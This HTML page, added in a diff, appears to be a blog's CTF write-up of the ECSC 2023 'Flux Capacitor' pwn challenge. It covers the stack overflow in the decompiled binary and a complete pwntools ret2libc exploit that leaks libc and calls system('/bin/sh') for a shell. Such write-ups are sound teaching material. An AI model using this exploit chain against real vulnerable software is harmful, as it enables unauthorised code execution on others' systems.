@@ -1,0 +1,181 @@
+<!doctypehtml>
+<html lang="en">
+<head>
+  <meta charset="UTF-8">
+  <title>ECSC 2023: Flux Capacitor</title>
+
+  <meta name="viewport"content="width=device-width,initial-scale=1">
+  <meta http-equiv="X-UA-Compatible"content="ie=edge">
+  <meta property="og:title"content="uhg's corner">
+  <meta property="og:image"content="https://i.ibb.co/4pRxk6j/trashthumbsup-c-websitethumb.png">
+  <meta property="og:description"content="vulnerability resarch, exploits and cve, ctf blog">
+  <meta property="og:url"content="https://ultimatehg.github.io">
+  <meta property="og:image:width"content="1200">
+  <meta property="og:image:height"content="627">
+  <meta property="og:type"content="website"> 
+
+  <link rel="shortcut icon"href="../assets/favicon.ico"type="image/x-icon">
+  <link rel="preload"href="../styles/article.css"as="style">
+  <link rel="stylesheet"href="../styles/article.css">
+</head>
+<body>
+  <header id="top-container"role="navigation">
+    <nav>
+  <a class="logo-link"href="/">
+    <h1>uhg's corner</h1>
+    <span>ctf_writeups | security_research | cs_stuff</span>
+  </a>
+  <small>
+    <a id="about"class="info-link"href="/about.html">👀About</a> /
+    <a id="works"class="info-link"href="/works.html">🔥Works</a> /
+    <a id="articles"class="info-link"href="/articles.html">📚Articles</a>
+  </small>
+</nav>
+
+  </header>
+  <main id="main-container">
+    <article id="article-container">
+      <h1 id="article-title">
+        ECSC 2023: Flux Capacitor
+      </h1>
+      
+        <h2 id="article-subtitle">
+          ECSC 2023 Day 1: Pwn
+        </h2>
+      
+      <time id="article-date">
+        2023.11.02
+      </time>
+      <section id="article-content-container">
+        <details><summary>Table of Contents</summary>
+<p><div class="table-of-contents"><ul><li><ul><li><a href="#foreword">Foreword</a></ul><li><a href="#flux-capacitor">Flux Capacitor</a></ul></div><p></p>
+</details>
+<h2 id="foreword"tabindex="-1">Foreword</h2>
+<p>This challenge was released near the end of Day 1 yet it’s a much easier pwn challenge than all the other challenges. It is just a straight forward buffer overflow ret2libc challenge.</p>
+<h1 id="flux-capacitor"tabindex="-1">Flux Capacitor</h1>
+<p>We run <code>checksec</code> on the binary:</p>
+<pre class="hljs"><code>[*] <span class="hljs-string">&#x27;/mnt/e/ctf_archive/ecsc2023/d1/flux_capacitor/flux_capacitor&#x27;</span>
+    Arch:     amd64-64-little
+    RELRO:    Full RELRO
+    Stack:    No canary found
+    NX:       NX enabled
+    PIE:      No PIE (0x400000)
+</code></pre>
+<p>It has Full RELRO and NX enabled, but no canary or PIE.</p>
+<p>We open the binary up in IDA to see that it’s as straight-forward as it gets.</p>
+<pre class="hljs"><code><span class="hljs-type">int</span> __fastcall <span class="hljs-title function_">main</span><span class="hljs-params">(<span class="hljs-type">int</span> argc, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **argv, <span class="hljs-type">const</span> <span class="hljs-type">char</span> **envp)</span>
+{
+  <span class="hljs-type">char</span> buf[<span class="hljs-number">32</span>]; <span class="hljs-comment">// [rsp+0h] [rbp-20h] BYREF</span>
+
+  setup(argc, argv, envp);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;\nFlux capacitor: \n&quot;</span>, <span class="hljs-number">0x13</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot; __         __\n&quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;(__)       (__)\n&quot;</span>, <span class="hljs-number">0x11</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot; \\ \\       / /\n&quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;  \\ \\     / /\n&quot;</span>, <span class="hljs-number">0xF</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;   \\ \\   / /\n&quot;</span>, <span class="hljs-number">0xE</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;    \\ \\ / /\n&quot;</span>, <span class="hljs-number">0xD</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;     \\   /\n&quot;</span>, <span class="hljs-number">0xC</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      \\ /\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      | |\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      | |\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      | |\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      |_|\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;      (_)\n&quot;</span>, <span class="hljs-number">0xB</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;\n\n[*] Year: [1955]&quot;</span>, <span class="hljs-number">0x13</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;\n[*] Plutonium &quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;is not available &quot;</span>, <span class="hljs-number">0x12</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;to everoyne.\n&quot;</span>, <span class="hljs-number">0xE</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;\n[Doc]  : We need &quot;</span>, <span class="hljs-number">0x13</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;to find a way to&quot;</span>, <span class="hljs-number">0x11</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot; fill the Flux &quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;Capacitor with &quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;energy. Any ideas&quot;</span>, <span class="hljs-number">0x12</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot; Marty?\n[Marty]: &quot;</span>, <span class="hljs-number">0x12</span>uLL);
+  read(<span class="hljs-number">0</span>, buf, <span class="hljs-number">0x100</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;\n[Doc]  : This &quot;</span>, <span class="hljs-number">0x10</span>uLL);
+  write(<span class="hljs-number">1</span>, <span class="hljs-string">&quot;will not work..\n\n&quot;</span>, <span class="hljs-number">0x12</span>uLL);
+  <span class="hljs-keyword">return</span> <span class="hljs-number">0</span>;
+}
+</code></pre>
+<p>Yep, that’s the whole binary.</p>
+<p>We can see that <code>char buf[32]</code> is declared with size 32 but <code>read(0, buf, 0x100uLL);</code> reads <code>0x100</code> bytes into <code>buf</code>.</p>
+<p>Since this challenge is Full RELRO and NX enabled, we cannot directly execute shellcode nor overwrite GOT, hence we will do ret2libc.</p>
+<p>Leak <code>write</code> address and return to main, calculate libc base, then perform ROP chain to pop shell.</p>
+<pre class="hljs"><code><span class="hljs-keyword">from</span> pwn <span class="hljs-keyword">import</span> *
+<span class="hljs-keyword">from</span> exploit <span class="hljs-keyword">import</span> *
+
+<span class="hljs-comment"># set exploit source, context binary, context log_level, libc</span>
+elf = context.binary = ELF(<span class="hljs-string">&quot;../sols/ezpwn/flux_capacitor_patched&quot;</span>, checksec=<span class="hljs-literal">False</span>)
+<span class="hljs-comment"># context.log_level = &#x27;debug&#x27;</span>
+libc = ELF(<span class="hljs-string">&quot;./libc.so.6&quot;</span>)
+
+<span class="hljs-comment"># Run binary 1st time</span>
+p = exploit_source(<span class="hljs-string">&quot;../sols/ezpwn/flux_capacitor_patched&quot;</span>, <span class="hljs-string">&quot;localhost&quot;</span>)
+
+rop = ROP(elf)
+
+<span class="hljs-comment"># find and pop write, then go back to main</span>
+rop.write(<span class="hljs-number">1</span>, elf.got[<span class="hljs-string">&#x27;write&#x27;</span>])
+rop.main()
+
+payload = flat({<span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>) + rop.chain()})
+
+p.sendlineafter(<span class="hljs-string">b&quot;[Marty]:&quot;</span>, payload)
+
+<span class="hljs-comment"># grab output, calculate libc base</span>
+p.recvuntil(<span class="hljs-string">b&quot;will not work..\n\n\0&quot;</span>)
+
+leak = u64(p.recvn(<span class="hljs-number">8</span>))
+offset = libc.sym.write
+libc.address = leak  - offset
+info(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(leak) =}</span>&quot;</span>)
+info(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(offset) =}</span>&quot;</span>)
+success(<span class="hljs-string">f&quot;<span class="hljs-subst">{<span class="hljs-built_in">hex</span>(libc.address) =}</span>&quot;</span>)
+
+pause()
+
+<span class="hljs-comment"># find /bin/sh and call system</span>
+rop1 = ROP(libc)
+
+rop1.system(<span class="hljs-built_in">next</span>(libc.search(<span class="hljs-string">b&quot;/bin/sh&quot;</span>)))
+p.sendlineafter(<span class="hljs-string">&quot;:&quot;</span>, flat({ <span class="hljs-number">0x20</span>: p64(<span class="hljs-number">0</span>) + rop1.chain() }))
+
+p.interactive()
+</code></pre>
+<p><code>cat flag.txt</code> for the flag.</p>
+
+      </section>
+      <section id="article-navigation">
+        
+          <div class="article-navigation-item article-navigation-next">
+            <a href="/article/17.html">
+              <div class="article-navigation-arrow article-navigation-next">＜</div>
+              <div class="article-navigation-content article-navigation-next">
+                <p class="article-navigation-title">ECSC 2023: Lady Luck</p>
+                <p class="article-navigation-subtitle">ECSC 2023 Day 3: Pwn</p>
+              </div>
+            </a>
+          </div>
+        
+        
+          <div class="article-navigation-item article-navigation-prev">
+            <a href="/article/15.html">
+              <div class="article-navigation-arrow article-navigation-prev">＞</div>
+              <div class="article-navigation-content article-navigation-prev">
+                <p class="article-navigation-title">ECSC 2023: Knife Party</p>
+                <p class="article-navigation-subtitle">ECSC 2023 Day 1: Pwn</p>
+              </div>
+            </a>
+          </div>
+        
+      </section>
+      <section id="article-list-button-container">
+        <a href="/articles.html">
+          <div id="article-list-button">📚</div>
+        </a>
+      </section>
+    </article>
+  </main>
+
+
